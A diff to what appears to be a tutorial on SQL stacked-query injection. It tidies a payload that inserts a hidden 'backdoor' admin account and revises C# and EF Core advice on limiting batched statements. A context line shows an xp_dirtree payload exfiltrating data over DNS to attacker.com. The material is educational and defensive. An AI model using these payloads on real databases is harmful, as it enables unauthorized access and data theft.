@@ -152,9 +152,9 @@ EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
 
 ```sql
 -- Create persistent access
-' ; IF NOT EXISTS (SELECT * FROM users WHERE username = 'backdoor') 
-BEGIN 
-  INSERT INTO users (username, password, role) VALUES ('backdoor', 'h4ck3d!', 'admin') 
+' ; IF NOT EXISTS (SELECT * FROM users WHERE username = 'backdoor')
+BEGIN
+  INSERT INTO users (username, password, role) VALUES ('backdoor', 'h4ck3d!', 'admin')
 END --
 ```
 
@@ -171,11 +171,18 @@ To prevent stacked query attacks:
 
 1. Use parameterized queries or stored procedures instead of string concatenation
 
-2. Use database connectors that don't allow multiple statements
+2. Use database connectors or configurations that limit multiple statements
+
+   **Note:** `SqlConnection` in ADO.NET does not have a built-in property to disable batching. Stacked query prevention depends on the library or ORM layer:
+
    ```csharp
-   // C# example - AllowBatchedCommands set to false
-   SqlConnection.AllowBatchedCommands = false; 
+   // EF Core - Disable batching by setting MaxBatchSize to 1
+   services.AddDbContext<MyDbContext>(options =>
+       options.UseSqlServer(connectionString, sqlOptions =>
+           sqlOptions.MaxBatchSize(1)));
    ```
+
+   For raw ADO.NET with `SqlClient`, stacked queries are controlled by the query itself—always use parameterized queries rather than relying on connection-level settings.
 
 3. Apply the principle of least privilege for database accounts
 
